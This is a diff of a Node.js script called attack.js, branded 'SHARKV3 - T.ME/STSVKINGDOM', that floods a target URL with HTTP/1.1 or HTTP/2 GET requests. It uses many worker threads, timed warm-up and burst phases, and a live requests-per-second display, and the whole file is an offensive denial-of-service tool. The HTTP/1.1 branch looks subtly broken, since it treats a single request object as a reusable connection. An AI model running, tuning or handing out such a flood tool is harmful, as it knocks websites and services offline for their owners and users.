@@ -1,17 +1,16 @@
-process.env.NODE_TLS_REJECT_UNAUTHORIZED = '0';
-
 const http2 = require('http2');
+const http = require('http');
 const { Worker, isMainThread, parentPort, workerData } = require('worker_threads');
 const { cpus } = require('os');
 const readline = require('readline');
 const net = require('net');
 
-const THREADS = cpus().length * 2; // 32 workers on 16vCPU
-const CONNECTIONS_PER_THREAD = 50; // Reduced connections per thread to avoid EADDRNOTAVAIL
+const THREADS = 16;
+const INITIAL_CONNECTIONS = 20;
 const POWER_MULTIPLIER = 2;
-const WARMUP_TIME = 5000;
-const MAX_INFLIGHT = 5000;
-const CONNECTION_DELAY = 100; // Delay to stagger connection attempts
+const WARMUP_TIME = 20000; // 20 seconds warmup
+const MAX_INFLIGHT = 2000;
+const MAX_RPS = 10000; // Adjust this depending on your needs
 
 let totalRequests = 0;
 let successCount = 0;
@@ -20,38 +19,54 @@ let maxRps = 0;
 let rpsLastSecond = 0;
 
 if (isMainThread) {
-    if (process.argv.length < 4) {
-        console.error('Usage: node attack.js <target> <duration_secs>');
+    if (process.argv.length < 5) {
+        console.error('Usage: node attack.js <target> <duration_secs> <protocol (h1/h2)>');
         process.exit(1);
     }
 
     const target = process.argv[2];
     const duration = parseInt(process.argv[3]);
+    const protocol = process.argv[4].toLowerCase();
+
+    if (protocol !== 'h1' && protocol !== 'h2') {
+        console.error('Invalid protocol. Use "h1" or "h2".');
+        process.exit(1);
+    }
 
     console.clear();
-    console.log(`Warming up... Starting Demon Mode in 5s`);
+    console.log(`Warming up... Starting attack in 5s`);
 
     setTimeout(() => {
         console.clear();
         console.log(`SHARKV3 - T.ME/STSVKINGDOM`);
         console.log(`===========================`);
 
+        // Initial 5 seconds to start threads
         for (let i = 0; i < THREADS; i++) {
-            new Worker(__filename, { workerData: { target, duration, initial: true } });
+            new Worker(__filename, { workerData: { target, duration, protocol, initial: true } });
         }
 
+        // After 5s start full attack for 10s, then 10-20s rest phase
         setTimeout(() => {
             for (let i = 0; i < THREADS * POWER_MULTIPLIER; i++) {
-                new Worker(__filename, { workerData: { target, duration, initial: false } });
+                new Worker(__filename, { workerData: { target, duration, protocol, initial: false } });
             }
-        }, WARMUP_TIME);
+        }, 5000);
 
+        // Rest period after the full throttle (10s to 20s phase)
+        setTimeout(() => {
+            for (let i = 0; i < THREADS * POWER_MULTIPLIER; i++) {
+                new Worker(__filename, { workerData: { target, duration, protocol, initial: true } });
+            }
+        }, 15000);
+
+        // Live stats
         setInterval(() => {
             maxRps = Math.max(maxRps, rpsLastSecond);
             renderStats();
             rpsLastSecond = 0;
         }, 1000);
-    }, WARMUP_TIME);
+    }, 5000);
 
     function renderStats() {
         readline.cursorTo(process.stdout, 0, 0);
@@ -80,8 +95,8 @@ if (isMainThread) {
     });
     server.listen(9999);
 } else {
-    const { target, duration, initial } = workerData;
-    const connections = CONNECTIONS_PER_THREAD;
+    const { target, duration, protocol, initial } = workerData;
+    const connections = initial ? INITIAL_CONNECTIONS : INITIAL_CONNECTIONS * POWER_MULTIPLIER;
     const end = Date.now() + duration * 1000;
 
     const socket = net.connect(9999, '127.0.0.1');
@@ -89,12 +104,20 @@ if (isMainThread) {
 
     function sendOne(client, inflight) {
         if (Date.now() > end) return;
-        if (inflight.count >= MAX_INFLIGHT) return setTimeout(() => sendOne(client, inflight), 1);
+
+        if (inflight.count >= MAX_INFLIGHT) {
+            return setTimeout(() => sendOne(client, inflight), 1);
+        }
 
         try {
             inflight.count++;
-            const req = client.request({ ':path': '/', ':method': 'GET' });
-            req.setNoDelay?.(true);
+            let req;
+            if (protocol === 'h2') {
+                req = client.request({ ':path': '/', ':method': 'GET' });
+                req.setNoDelay?.(true);
+            } else {
+                req = http.request(target, { method: 'GET' });
+            }
             req.on('response', () => {
                 sendStat('ok');
                 inflight.count--;
@@ -116,18 +139,20 @@ if (isMainThread) {
     function createConnection() {
         let client;
         try {
-            client = http2.connect(target);
-            client.socket?.setNoDelay(true);
-            client.settings({ enablePush: false });
+            if (protocol === 'h2') {
+                client = http2.connect(target);
+            } else {
+                client = http.request(target);
+            }
 
             client.on('error', () => {});
             client.on('close', () => setTimeout(createConnection, 100));
             client.on('connect', () => {
                 const inflight = { count: 0 };
-                for (let i = 0; i < 300; i++) sendOne(client, inflight);
+                for (let i = 0; i < 100; i++) sendOne(client, inflight);
             });
         } catch {
-            setTimeout(createConnection, CONNECTION_DELAY);
+            setTimeout(createConnection, 250);
         }
     }
 
